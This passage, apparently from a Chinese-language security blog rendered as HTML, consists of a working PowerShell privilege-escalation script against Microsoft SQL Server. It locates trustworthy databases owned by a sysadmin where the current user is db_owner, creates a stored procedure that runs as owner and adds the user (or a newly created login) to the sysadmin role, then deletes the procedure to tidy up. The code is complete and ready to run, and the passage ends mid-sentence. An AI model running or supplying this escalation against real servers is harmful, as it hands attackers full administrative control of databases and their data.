class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Create data table to house list of trusted databases owned by a sysadmin &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$IsSysAdmin = New-Object System.Data.DataTable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableDatabases = New-Object System.Data.DataTable </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableDBOwner = New-Object System.Data.DataTable </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$CheckforSysadmin = New-Object System.Data.DataTable </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Check if user is already a sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$QueryElevate = &quot;select is_srvrolemember(&#39;sysadmin&#39;) as IsSysAdmin&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$IsSysAdmin.Load($results) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn.Close() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$IsSysAdmin | Select-Object -First 1 IsSysAdmin | foreach {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Checksysadmin = $_.IsSysAdmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($Checksysadmin -ne 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] You&#39;re already a sysadmin - no escalation needed.&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Break &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Get a list of trusted databases owned by a sysadmin </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# ----------------------------------------------- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Setup query to grab a list of accessible databases</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$QueryDatabases = &quot;SELECT d.name AS DATABASENAME </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;FROM sys.server_principals r </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;INNER JOIN sys.server_principals p ON </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;p.principal_id = m.member_principal_id </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;inner join sys.databases d on suser_sname(d.owner_sid) = p.name </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;WHERE is_trustworthy_on = 1 AND d.name NOT IN (&#39;MSDB&#39;) and r.type = &#39;R&#39; and r.name = N&#39;sysadmin&#39;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# User status</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write-host &quot;[*] Enumerating accessible trusted databases owned by sysadmins...&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Query the databases and load the results into the TableDatabases data table object</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$TableDatabases.Load($results)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Check if any accessible databases where found </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($TableDatabases.rows.count -eq 0){</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] No accessible databases found.&quot; -foreground &quot;red&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$DbCount = $TableDatabases.rows.count &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Found $DbCount trusted databases owned by a sysadmin.&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Check if current user has db_owner role in any of them</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($TableDatabases.rows.count -ne 0){ &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Checking if $ConnectUser has the db_owner role in any of them...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableDatabases | foreach {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[string]$CurrentDatabase = $_.databasename &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Setup query to grab a list of databases</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$QueryProcedures = &quot;use $CurrentDatabase;select db_name() as db,rp.name as database_role, mp.name as database_user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;from [$CurrentDatabase].sys.database_role_members drm</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;join [$CurrentDatabase].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;join [$CurrentDatabase].sys.database_principals mp on (drm.member_principal_id = mp.principal_id) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where rp.name = &#39;db_owner&#39; and mp.name = SYSTEM_USER&quot; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Query the databases and load the results into the TableDatabase data table object</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryProcedures,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Try{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$results2 = $cmd.ExecuteReader()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableDBOwner.Load($results2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Catch {}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Attempt to escalate privileges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -------------------------------------------------</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Get number database wwhere the user is db_owner</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$DbOwnerRoleCount = $TableDBOwner.rows.count </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($DbOwnerRoleCount -ne 0) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Set db to be used for escalating privs # fix this</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$TableDBOwner | Select-Object db -first 1 | foreach {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ElevateOnDb = $_.db &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Add new user if provided</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($newuser -and $newPass){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$AddUser = &quot;CREATE LOGIN $newuser WITH PASSWORD = &#39;$newPass&#39;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$UsertoElevate = $newuser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Message = &quot; create and&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$AddUser = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$UsertoElevate = $ConnectUser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Message = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Status user</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] $ConnectUser has db_owner role in $DbOwnerRoleCount of the databases.&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Attempting to$Message add $UsertoElevate to the sysadmin role via the $ElevateOnDb database...&quot; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Set authentication type and create connection string for the targeted database </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($SqlUser -and $SqlPass){ &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SQL login</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=$ElevateOnDb;User ID=$SqlUser;Password=$SqlPass;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[string]$ConnectUser = $SqlUser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Trusted connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=$ElevateOnDb;Integrated Security=SSPI;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$UserDomain = [Environment]::UserDomainName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Username = &nbsp;[Environment]::UserName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ConnectUser = &quot;$UserDomain\$Username&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Create stored procedures to escalate privileges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$QueryElevate = &quot;CREATE PROCEDURE sp_elevate_me</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WITH EXECUTE AS OWNER</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;begin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$AddUser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXEC sp_addsrvrolemember &#39;$UsertoElevate&#39;,&#39;sysadmin&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Execute stored procedures to escalate privileges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$QueryElevate = &quot;EXEC sp_elevate_me&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close() </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Remove stored procedure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$QueryElevate = &quot;drop proc sp_elevate_me&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close() </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Verify that privilege escalation works</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If (-Not ($newuser -and $newPass)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$QueryElevate = &quot;select is_srvrolemember(&#39;sysadmin&#39;) as IsSysAdmin&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$results = $cmd.ExecuteReader() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CheckforSysadmin.Load($results) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close() </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CheckforSysadmin | Select-Object -First 1 IsSysAdmin | foreach {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Checksysadmin2 = $_.IsSysAdmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($Checksysadmin2 -ne 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Success! - $UsertoElevate is now a sysadmin.&quot; -foreground &quot;green&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Sorry, something failed, no sysadmin for you.&quot; -foreground &quot;red&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host &quot;[*] Sorry, $ConnectUser doesn&#39;t have the db_owner role in any of the sysadmin databases.&quot; -foreground &quot;red&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write-host &quot;[*] All done.&quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先我们先把</span><span class="cs8926E06">sysadmin</span><span 